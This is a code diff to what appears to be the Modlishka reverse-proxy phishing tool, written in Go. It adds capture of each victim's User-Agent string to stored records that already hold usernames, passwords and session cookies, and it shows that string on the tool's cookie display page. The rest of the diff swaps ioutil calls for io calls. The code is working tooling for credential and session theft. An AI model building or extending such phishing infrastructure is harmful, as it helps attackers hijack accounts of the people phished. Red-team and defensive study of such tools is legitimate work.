@@ -22,7 +22,6 @@ import (
 	"fmt"
 	"html/template"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"net/url"
 	"os"
@@ -251,6 +250,11 @@ setTimeout(function() {document.location='/'; }, 5000);
 </html>
 `
 
+type TemplateOutput struct {
+	Cookies string
+	UserAgent string
+}
+
 var cookietemplate = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -264,8 +268,10 @@ var cookietemplate = `<!DOCTYPE html>
 <body>
 
 <div class="container">
+  <h2>User Agent</h2>
+  <pre>{{ .UserAgent }}</pre>
   <h2>Cookies</h2>
-  <pre>{{ . }}</pre>
+  <pre>{{ .Cookies }}</pre>
 </div>
 
 </body>
@@ -278,6 +284,7 @@ type Victim struct {
 	Username   string
 	Password   string
 	Session    string
+	UserAgent  string
 	Terminated bool
 }
 
@@ -538,6 +545,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		entry.Terminated = true
 	}
 
+	if victim.UserAgent != "" {
+		entry.UserAgent = victim.UserAgent
+	}
+
 	err = config.addEntry(entry)
 	if err != nil {
 		return err
@@ -603,7 +614,7 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 			return nil, false
 		}
 
-		body, err := ioutil.ReadAll(req.Body)
+		body, err := io.ReadAll(req.Body)
 		if err != nil {
 			log.Debugf("Error reading body: %v", err)
 		}
@@ -636,7 +647,7 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 		//}
 
 		// reset body state.
-		req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+		req.Body = io.NopCloser(bytes.NewBuffer(body))
 
 	}
 
@@ -875,7 +886,7 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: "", UserAgent: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -898,13 +909,17 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 	cookiesByte, _ := json.MarshalIndent(cookies, "", "  ")
 	cookiesOut := string(cookiesByte)
 
+	userAgentOut := entry.UserAgent
+
+	templateData := TemplateOutput{Cookies: cookiesOut, UserAgent: userAgentOut}
+
 	w.WriteHeader(http.StatusOK)
 
 	w.Header().Set("Content-Type", "application/html")
 
 	t := template.New("modlishkacookiejson")
 	t, _ = t.Parse(cookietemplate)
-	_ = t.Execute(w, cookiesOut)
+	_ = t.Execute(w, templateData)
 
 }
 
@@ -1003,7 +1018,7 @@ func init() {
 				return
 			}
 
-			ctb, _ := ioutil.ReadAll(ct)
+			ctb, _ := io.ReadAll(ct)
 			if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
 				log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
@@ -1114,6 +1129,14 @@ func init() {
 				notifyCollection(&victim)
 				//_=CConfig.printEntries()
 
+			}
+
+			// update user agent string
+			victim := Victim{UUID: context.UserID}
+			entry, err := CConfig.getEntry(&victim)
+			if err == nil {
+				entry.UserAgent = req.Header.Get("User-Agent")
+				_ = CConfig.updateEntry(entry)
 			}
 
 			cookies := req.Cookies()
